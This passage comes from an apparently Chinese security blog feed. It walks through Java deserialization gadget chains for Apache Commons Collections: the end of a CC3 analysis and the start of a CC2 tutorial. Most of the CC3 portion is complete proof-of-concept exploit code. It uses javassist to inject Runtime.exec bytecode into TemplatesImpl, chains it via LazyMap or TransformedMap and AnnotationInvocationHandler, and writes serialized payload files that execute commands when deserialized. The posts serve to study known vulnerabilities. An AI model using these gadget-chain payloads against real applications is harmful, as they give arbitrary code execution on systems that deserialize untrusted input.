class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line"><span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line"><span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞。</p><p>最后的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(invohandlerproxy);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-7.png" title="执行实现"></p><h2 id="CC3延伸TransformedMap"><a href="#CC3延伸TransformedMap" class="headerlink" title="CC3延伸TransformedMap"></a>CC3延伸TransformedMap</h2><p>上述的CC3-POC主要还是加载字节码+LazyMap，在CC1链学习中学到CC1链有LazyMap链还有一条TransformedMap链，且加载字节码主体不变，触发方式也是去调用ChainedTransformer的串联方法。那也同理，可以使用TransformedMap链作为入口点。</p><p>构造POC：<br>同理，加载字节码主体不变，直接搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>加载字节码有了，现在就是触发字节码的部分，也是ChainedTransformer类的串联方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>触发方式有了，现在就是找到反序列化入口，即CC1的TransformedMap入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br></pre></td></tr></table></figure><p>最后就是对obj对象进行序列化和反序列化触发利用。</p><p>得到完整代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用TransformedMap链作为序列化入口</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(obj);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-8.png" title="执行实现"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>主要还是变式吧，cc1和cc2的结合，并找到了新的两个类<code>TrAXFilter</code>、<code>InstantiateTransformer</code>串联进行执行，采用cc1的LazyMap和cc2的字节码实例化，相对理解起来轻松很多，同理也可以使用cc1的TransformedMap利用链改变入口点，进行再次变式，原理上差不多，接着后面链学习吧。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections-3">https://paper.seebug.org/1242/#commons-collections-3</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC2链学习与分析</title>
      <link href="/posts/7e30cd4a.html"/>
      <url>/posts/7e30cd4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。<br>这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-yso链学习与分析</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（要求java8以上）<br>Commons Collections：4.0（漏洞版本）（在3版本中<code>TransformingComparator</code>类未实现序列化接口所以不存在该利用链，4版本才实现）<br>javassist：3.20.0-GA<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、利用链基础前提"><a href="#0x03、利用链基础前提" class="headerlink" title="0x03、利用链基础前提"></a>0x03、利用链基础前提</h1><h2 id="javassist字节码增强类"><a href="#javassist字节码增强类" class="headerlink" title="javassist字节码增强类"></a>javassist字节码增强类</h2><p>Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</p><blockquote><p>引用官网的描述：<br>Javassist（Java编程助手）使Java字节码操作变得简单。它是一个用于在Java中编辑字节码的类库；它使Java程序能够在运行时定义一个新类，并在JVM加载时修改类文件。与其他类似的字节码编辑器不同，Javassist提供了两级API：源代码级和字节码级。如果用户使用源代码级API，他们可以在不知道Java字节码规范的情况下编辑类文件。整个API仅使用Java语言的词汇表设计。您甚至可以以源文本的形式指定插入的字节码；Javassist实时编译。另一方面，字节码级API允许用户像其他编辑器一样直接编辑类文件。</p></blockquote><p>由于<code>java</code>运行通常由<code>java</code>文件编译成<code>class</code>文件供<code>jvm</code>运行，更改代码内容需要重新编写<code>java</code>文件再编译成<code>class</code>文件运行。<br><strong><code>Javassist</code>作用就是动态修改<code>.class</code>文件内容</strong>，且不需要知道<code>jvm</code>相关指令调用，<code>javassist</code>的引用能更简单快速的修改<code>class</code>文件的内容。</p><p>实现的效果有点类似反射的调用方式，不过一个是更改字节文件，反射是调用类，目的不同。</p><p><strong>涉及的类</strong></p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool：<br>基于哈希表(Hashtable)实现的CtClass对象容器，其中键是类名称, 值是表示该类的CtClass对象，同HashMap实现的Map接口，但不同于哈希表(Hashtable)的键名不能为null。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">getDefault()</td><td align="left">返回默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）</td></tr><tr><td align="left">insertClassPath(java.lang.String pathname)</td><td align="left">在搜索路径的开头插入目录或jar（或zip）文件</td></tr><tr><td align="left">insertClassPath(ClassPath cp)</td><td align="left">在搜索路径的开头插入类对象，当用户系统存在多个类加载器，默认加载getDefault()搜索不到加载类可使用该方法添加路径</td></tr><tr><td align="left">getClassLoader()</td><td align="left">获得类加载器</td></tr><tr><td align="left">get(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用</td></tr><tr><td align="left">getOrNull(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用，未找到该文件返回null，不抛出异常</td></tr><tr><td align="left">appendClassPath(ClassPath cp)</td><td align="left">将ClassPath对象附加到搜索路径的末尾</td></tr><tr><td align="left">makeClass(java.lang.String classname)</td><td align="left">创建一个新的public类</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">setSuperclass(CtClass clazz)</td><td align="left">添加父类</td></tr><tr><td align="left">setInterfaces</td><td align="left">添加父类接口</td></tr><tr><td align="left">toClass(java.lang.invoke.MethodHandles.Lookup lookup)</td><td align="left">将此类转换为java.lang.Class对象</td></tr><tr><td align="left">toBytecode()</td><td align="left">将该类转换为类文件，对象类型为byte[]</td></tr><tr><td align="left">writeFile()</td><td align="left">将由此CtClass 对象表示的类文件写入当前目录</td></tr><tr><td align="left">writeFile(java.lang.String directoryName)</td><td align="left">将由此CtClass 对象表示的类文件写入本地磁盘</td></tr><tr><td align="left">makeClassInitializer()</td><td align="left">制作一个空的类初始化程序（静态构造函数），对象类型为CtConstructor</td></tr><tr><td align="left">detach</td><td align="left">将CtClass对象从ClassPool池中删除</td></tr><tr><td align="left">freeze</td><td align="left">冻结一个类，使其变为不可修改状态</td></tr><tr><td align="left">isfreeze</td><td align="left">判断该类是否存于冻结状态</td></tr><tr><td align="left">prune</td><td align="left">删除类不必要的属性，减少内存占用</td></tr><tr><td align="left">deforst</td><td align="left">解冻一个类，使其变为可修改状态</td></tr><tr><td align="left">addField</td><td align="left">添加字段</td></tr><tr><td align="left">addMethod</td><td align="left">添加方法</td></tr><tr><td align="left">addConstructor</td><td align="left">添加构造器</td></tr><tr><td align="left">addInterface</td><td align="left">添加接口</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法 效果相同</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新方法</span></span><br><span class="line">        ct.addMethod(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtMethods"><a href="#CtMethods" class="headerlink" title="CtMethods"></a>CtMethods</h3><p>表示类中的方法</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">insertBefore</td><td align="left">在方法起始位置插入代码</td></tr><tr><td align="left">insterAfter</td><td align="left">在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception</td></tr><tr><td align="left">insertAt</td><td align="left">在指定位置插入代码</td></tr><tr><td align="left">setBody</td><td align="left">将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除</td></tr><tr><td align="left">make</td><td align="left">创建一个方法</td></tr><tr><td align="left">addParameter</td><td align="left">添加参数</td></tr><tr><td align="left">setName</td><td align="left">设置方法名</td></tr></tbody></table><p>注:插入的代码必须是完整的代码语句，包括分号结束语。</p><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span 